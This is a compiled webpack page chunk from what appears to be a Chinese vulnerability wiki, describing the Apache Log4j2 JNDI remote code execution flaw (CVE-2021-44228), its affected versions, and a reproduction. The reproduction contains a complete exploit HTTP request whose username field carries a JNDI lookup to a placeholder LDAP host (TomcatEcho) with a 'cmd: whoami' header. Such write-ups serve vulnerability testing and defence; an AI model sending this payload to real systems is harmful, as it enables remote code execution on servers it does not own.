(window.webpackJsonp=window.webpackJsonp||[]).push([[380],{2105:function(s,a,t){s.exports=t.p+"assets/img/1639112758169-0e01d095-78c9-475c-94bc-9a05ae161b7f.440015c1.png"},2106:function(s,a,t){s.exports=t.p+"assets/img/1639112868435-e938cac8-d736-466c-acc0-f94fae3ef688.eeb64d5a.png"},2634:function(s,a,t){"use strict";t.r(a);var e=t(75),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"apache-log4j2-jndi-远程命令执行漏洞-cve-2021-44228"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#apache-log4j2-jndi-远程命令执行漏洞-cve-2021-44228"}},[s._v("#")]),s._v(" Apache Log4j2 JNDI 远程命令执行漏洞 CVE-2021-44228")]),s._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),e("p",[s._v("Apache Log4j2是一款使用非常广泛的Java日志框架。2021年12月9日，Apache Log4j2爆出存在远程代码执行漏洞，由于Apache Log4j2广泛地应用在各种Web程序中，该漏洞涉及用户量较大，危害性非常之高，漏洞影响版本为2.0~2.14.1。")]),s._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("2.0~2.14.1")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("使用此依赖的JAVA应用")]),e("br"),s._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("暂无确切语法")]),e("br"),s._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),e("p",[s._v("参数点发送请求")]),s._v(" "),e("p",[e("img",{attrs:{src:t(2105),alt:"img"}})]),s._v(" "),e("div",{staticClass:"language-go line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-go"}},[e("code",[s._v("POST "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.0")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("login HTTP"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\nCookie"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" JSESSIONID_AV"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("567CEDA964EE4D5DA8B7FC8C90912B01\nContent"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("86")]),s._v("\nSec"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Ch"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Ua"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('" Not A;Brand"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"99"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Chromium"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"96"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Google Chrome"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"96"')]),s._v("\nAccept"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("json"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" text"),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("javascript"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v('/*; q=0.01\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\nSec-Ch-Ua-Platform: "macOS"\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\ncmd: whoami\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n{"username":"${jndi:ldap://xxx.xxx.xxx.xxx:1389/Basic/TomcatEcho}","password":"admin"}\n')])])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br")])]),e("p",[e("img",{attrs:{src:t(2106),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);